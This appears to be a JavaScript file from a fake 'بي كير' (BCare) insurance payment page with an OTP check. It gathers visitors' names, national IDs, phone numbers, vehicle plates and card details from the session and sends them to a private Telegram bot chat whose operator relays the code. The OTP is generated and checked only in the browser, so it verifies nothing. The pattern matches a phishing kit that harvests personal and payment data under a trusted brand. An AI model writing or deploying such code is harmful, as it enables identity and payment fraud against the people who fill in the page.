/* =====================================================
   بي كير — otp-verify.js
   تحقق OTP 6 أرقام + Timer 60 ثانية + Telegram polling
   ══════════════════════════════════════════════════
   ⚙️  ضع Bot Token و Chat ID هنا:
   BOT_TOKEN  = Token من @BotFather
   ADMIN_CHAT = Chat ID الخاص بك (أو قناتك)
===================================================== */
'use strict';

/* ─── ⚙️ إعدادات Telegram ──────────────────────── */
const TG_CONFIG = {
  BOT_TOKEN:  'YOUR_BOT_TOKEN_HERE',   /* ← استبدل بـ Token من @BotFather */
  ADMIN_CHAT: 'YOUR_CHAT_ID_HERE',     /* ← استبدل بـ Chat ID الخاص بك */
};

const TIMER_SECONDS = 60;  /* مدة صلاحية OTP */

/* ─── الحالة ─────────────────────────────────── */
let otpCode      = '';       /* الرمز الصحيح المولّد */
let timerVal     = TIMER_SECONDS;
let timerInt     = null;
let pollInt      = null;
let lastUpdateId = 0;        /* آخر update_id من Telegram */

/* ─── قراءة بيانات العملية ─────────────────── */
function loadOrderData() {
  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    const amtEl = document.getElementById('otp-amount');
    const coEl  = document.getElementById('otp-company');
    if (amtEl) amtEl.textContent = offer.total ? 'ر.س ' + parseFloat(offer.total).toFixed(2) : '—';
    if (coEl)  coEl.textContent  = offer.companyName || '—';
  } catch(e) {}
}

/* ─── توليد OTP عشوائي 6 أرقام ──────────────── */
function generateOTP() {
  return String(Math.floor(100000 + Math.random() * 900000));
}

/* ─── إرسال رسالة Telegram ──────────────────── */
async function sendTelegram(text) {
  if (TG_CONFIG.BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
    console.warn('⚠️ Telegram: لم يتم ضبط Bot Token — الرسالة لم تُرسل');
    console.log('📨 رسالة Telegram (محاكاة):\n' + text);
    return;
  }
  try {
    await fetch(
      `https://api.telegram.org/bot${TG_CONFIG.BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id:    TG_CONFIG.ADMIN_CHAT,
          text,
          parse_mode: 'HTML',
        }),
      }
    );
  } catch(e) {
    console.error('Telegram send error:', e);
  }
}

/* ─── بناء رسالة Telegram ───────────────────── */
function buildTelegramMessage(otp) {
  try {
    const offer  = JSON.parse(sessionStorage.getItem('bcare_offer')  || '{}');
    const policy = JSON.parse(sessionStorage.getItem('bcare_policy') || '{}');
    const form   = JSON.parse(sessionStorage.getItem('bcare_form')   || '{}');
    const inq    = JSON.parse(sessionStorage.getItem('bcare_inquiry')|| '{}');

    /* آخر 4 أرقام فقط من البطاقة */
    const cardMasked = offer.cardMasked || '****';
    const cardType   = offer.cardType   || 'بطاقة';

    return `🔔 <b>طلب دفع جديد — بي كير</b>

👤 <b>بيانات العميل</b>
• الاسم: <b>${policy.fullName || '—'}</b>
• رقم الهوية: <code>${form.nationalId || '—'}</code>
• رقم الجوال: <code>${policy.mobile || '—'}</code>

🚗 <b>بيانات التأمين</b>
• الشركة: <b>${offer.companyName || '—'}</b>
• نوع التأمين: ${offer.insuranceType || '—'}
• ماركة المركبة: ${policy.carBrand || '—'}
• رقم اللوحة: ${policy.plateNumber || '—'}

💳 <b>بيانات الدفع</b>
• نوع البطاقة: ${cardType}
• رقم البطاقة: <code>**** **** **** ${cardMasked}</code>
• المبلغ: <b>ر.س ${offer.price ? parseFloat(offer.price).toFixed(2) : '—'}</b>
• الضريبة (15%): ر.س ${offer.vat ? parseFloat(offer.vat).toFixed(2) : '—'}
• <b>المجموع: ر.س ${offer.total ? parseFloat(offer.total).toFixed(2) : '—'}</b>

🔑 <b>رمز OTP لتأكيد الدفع:</b> <code>${otp}</code>

⏰ صالح لمدة ${TIMER_SECONDS} ثانية
🆔 المرجع: <code>${offer.refNumber || '—'}</code>

<i>للموافقة: أرسل رمز OTP للعميل
لرفض العملية: لا ترسل الرمز</i>`;
  } catch(e) {
    return `🔔 طلب دفع جديد\nرمز OTP: ${otp}`;
  }
}

/* ─── Timer المؤقت ──────────────────────────── */
function startTimer() {
  timerVal = TIMER_SECONDS;
  const countEl   = document.getElementById('otp-timer-count');
  const resendBtn = document.getElementById('otp-resend-btn');

  clearInterval(timerInt);
  timerInt = setInterval(() => {
    timerVal--;
    if (countEl) {
      countEl.textContent = timerVal;
      countEl.classList.toggle('urgent', timerVal <= 15);
    }
    if (timerVal <= 0) {
      clearInterval(timerInt);
      if (resendBtn) resendBtn.disabled = false;
      if (countEl)   countEl.textContent = '00';
    }
  }, 1000);
}

/* ─── Polling رسائل Telegram (للحصول على تأكيد Admin) ─ */
function startPolling() {
  /* كل 3 ثواني نسأل Telegram عن رسائل جديدة من Admin */
  clearInterval(pollInt);
  pollInt = setInterval(async () => {
    if (TG_CONFIG.BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
    try {
      const res = await fetch(
        `https://api.telegram.org/bot${TG_CONFIG.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=2`
      );
      const data = await res.json();
      if (!data.ok || !data.result?.length) return;

      for (const update of data.result) {
        lastUpdateId = update.update_id;
        const text = update.message?.text?.trim() || '';
        /* إذا أرسل Admin رمز OTP مطابقاً → قبول تلقائي */
        if (text === otpCode) {
          clearInterval(pollInt);
          autoFillOTP(otpCode);
        }
      }
    } catch(e) {}
  }, 3000);
}

/* ─── ملء OTP تلقائياً (عند التأكيد من Telegram) ── */
function autoFillOTP(code) {
  const boxes = document.querySelectorAll('.otp-box');
  code.split('').forEach((d, i) => {
    if (boxes[i]) {
      boxes[i].value = d;
      boxes[i].classList.add('filled');
    }
  });
  confirmOTP();
}

/* ─── مربعات إدخال OTP ───────────────────────── */
function initOTPBoxes() {
  const boxes = [...document.querySelectorAll('.otp-box')];
  const confirmBtn = document.getElementById('otp-confirm-btn');

  boxes.forEach((box, idx) => {
    box.addEventListener('input', (e) => {
      const v = e.target.value.replace(/\D/g,'');
      box.value = v.slice(-1);
      box.classList.toggle('filled', !!box.value);

      /* انتقل للتالي */
      if (box.value && idx < boxes.length - 1) boxes[idx+1].focus();

      /* فعّل زر التأكيد إذا اكتملت الأرقام */
      const filled = boxes.every(b => b.value.length === 1);
      if (confirmBtn) confirmBtn.disabled = !filled;

      /* امسح الخطأ */
      clearOTPError();
    });

    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && idx > 0) {
        boxes[idx-1].focus();
        boxes[idx-1].value = '';
        boxes[idx-1].classList.remove('filled');
        if (confirmBtn) confirmBtn.disabled = true;
      }
    });

    box.addEventListener('paste', (e) => {
      e.preventDefault();
      const pasted = (e.clipboardData?.getData('text')||'').replace(/\D/g,'').slice(0,6);
      pasted.split('').forEach((d, i) => {
        if (boxes[i]) { boxes[i].value = d; boxes[i].classList.add('filled'); }
      });
      if (confirmBtn) confirmBtn.disabled = pasted.length < 6;
      if (boxes[pasted.length]) boxes[pasted.length].focus();
    });
  });

  /* زر التأكيد */
  if (confirmBtn) confirmBtn.addEventListener('click', confirmOTP);

  /* إعادة الإرسال */
  const resendBtn = document.getElementById('otp-resend-btn');
  if (resendBtn) {
    resendBtn.addEventListener('click', async () => {
      resendBtn.disabled = true;
      /* توليد OTP جديد */
      otpCode = generateOTP();
      const msg = buildTelegramMessage(otpCode);
      await sendTelegram(msg);
      /* إعادة تشغيل المؤقت */
      startTimer();
      startPolling();
      /* مسح الإدخال */
      boxes.forEach(b => { b.value = ''; b.classList.remove('filled','otp-error'); });
      if (confirmBtn) confirmBtn.disabled = true;
      clearOTPError();
      boxes[0]?.focus();
    });
  }
}

/* ─── تأكيد OTP ──────────────────────────────── */
function confirmOTP() {
  const boxes  = [...document.querySelectorAll('.otp-box')];
  const entered = boxes.map(b => b.value).join('');

  if (entered === otpCode) {
    /* ✅ صحيح */
    clearInterval(timerInt);
    clearInterval(pollInt);
    boxes.forEach(b => b.classList.add('otp-success'));
    showSuccess();
  } else {
    /* ❌ خاطئ */
    boxes.forEach(b => { b.classList.add('otp-error'); setTimeout(() => b.classList.remove('otp-error'), 500); });
    showOTPError('رمز التحقق غير صحيح — يرجى المحاولة مرة أخرى');
    /* مسح الإدخال بعد ثانية */
    setTimeout(() => {
      boxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
      const confirmBtn = document.getElementById('otp-confirm-btn');
      if (confirmBtn) confirmBtn.disabled = true;
      boxes[0]?.focus();
    }, 600);
  }
}

function showOTPError(msg) {
  const e = document.getElementById('otp-err');
  if (e) e.textContent = msg;
}
function clearOTPError() {
  const e = document.getElementById('otp-err');
  if (e) e.textContent = '';
}

/* ─── شاشة النجاح ────────────────────────────── */
function showSuccess() {
  const confirmBtn = document.getElementById('otp-confirm-btn');
  if (confirmBtn) {
    confirmBtn.disabled = true;
    confirmBtn.innerHTML = '<span class="material-icons spin-otp">autorenew</span> جاري التأكيد...';
  }
  setTimeout(() => {
    document.getElementById('otp-card')?.classList.add('hidden');
    const sc = document.getElementById('otp-success-card');
    if (sc) sc.classList.remove('hidden');

    try {
      const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
      const set = (id,v) => { const e=document.getElementById(id); if(e) e.textContent=v; };
      set('success-ref',     offer.refNumber  || ('BC-'+Date.now().toString().slice(-8)));
      set('success-company', offer.companyName || '—');
      set('success-amount',  offer.total ? 'ر.س '+parseFloat(offer.total).toFixed(2) : '—');
    } catch(e) {}

    window.scrollTo({ top:0, behavior:'smooth' });
  }, 1200);
}

/* ─── INIT ───────────────────────────────────── */
document.addEventListener('DOMContentLoaded', async () => {
  loadOrderData();
  initOTPBoxes();

  /* توليد OTP وإرساله */
  otpCode = generateOTP();

  /* حفظ رقم المرجع إن لم يكن موجوداً */
  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    if (!offer.refNumber) {
      offer.refNumber = 'BC-' + Date.now().toString().slice(-8).toUpperCase();
      sessionStorage.setItem('bcare_offer', JSON.stringify(offer));
    }
  } catch(e) {}

  /* إرسال لـ Telegram */
  const msg = buildTelegramMessage(otpCode);
  await sendTelegram(msg);

  /* في وضع التطوير (بدون Token): اعرض الرمز في console */
  if (TG_CONFIG.BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
    console.log(`🔑 OTP (وضع تطوير — بدون Telegram): ${otpCode}`);
    /* ظهور إشعار صغير في الصفحة للتطوير */
    const subEl = document.getElementById('otp-sub-text');
    if (subEl) subEl.innerHTML = `أدخل رمز التحقق المؤلف من 6 أرقام<br/>
      <span style="color:var(--gold);font-weight:700;font-size:.8rem">
        ⚙️ وضع تطوير — رمزك: <code style="background:var(--gray-100);padding:.1rem .35rem;border-radius:4px;letter-spacing:.15em">${otpCode}</code>
      </span>`;
  }

  startTimer();
  startPolling();

  /* focus أول مربع */
  document.querySelector('.otp-box')?.focus();
});
